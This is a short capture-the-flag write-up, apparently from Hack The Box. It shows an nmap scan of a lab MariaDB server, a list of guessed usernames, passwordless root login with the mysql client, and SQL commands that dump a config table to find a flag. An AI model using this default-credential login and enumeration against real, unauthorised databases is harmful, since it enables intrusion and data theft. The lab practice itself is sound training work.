# 🐬 MariaDB SQL Server Walkthrough

Okay so this one was a MariaDB SQL server, and tbh the nmap was taking forever to load — super annoying. Eventually, enumeration showed the SQL server running with port open and exposed. We decided to brute basic credentials to get access.

## 🔍 Nmap Scan

```bash
nmap -p- -sV 10.129.206.159
```

Discovered an open MariaDB SQL service on the host.

## 🔐 Logging In

Tried the following common usernames:

- user  
- admin  
- administrator  
- guest  
- ✅ root (no password required)

Command used:

```bash
mysql -h 10.129.206.159 -u root -p
```

Just hit enter when prompted for a password — logged in successfully as root.

## 🧭 SQL Enumeration

Once inside the MariaDB shell, we needed to map out what was available.

### Step 1: List All Databases

```sql
SHOW DATABASES;
```

Output:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| htb                |
+--------------------+
```

We obviously chose to look into the `htb` database.

### Step 2: Use the Target Database

```sql
USE htb;
```

### Step 3: List Tables in `htb`

```sql
SHOW TABLES;
```

Output:

```
+------------------+
| Tables_in_htb    |
+------------------+
| config           |
| users            |
+------------------+
```

### Step 4: Dump Contents of `config`

```sql
SELECT * FROM config;
```

This revealed config settings — one of the entries contained the flag we were looking for.

## 📌 Command Summary

```sql
SHOW DATABASES;        -- Lists all available databases
USE htb;               -- Switch to HTB database
SHOW TABLES;           -- Displays tables in the selected DB
SELECT * FROM config;  -- Outputs all rows from config table
```

## ✅ Box Complete

Logged in using default root credentials. No password needed. Dumped the config table from the `htb` database and recovered the flag with zero resistance.
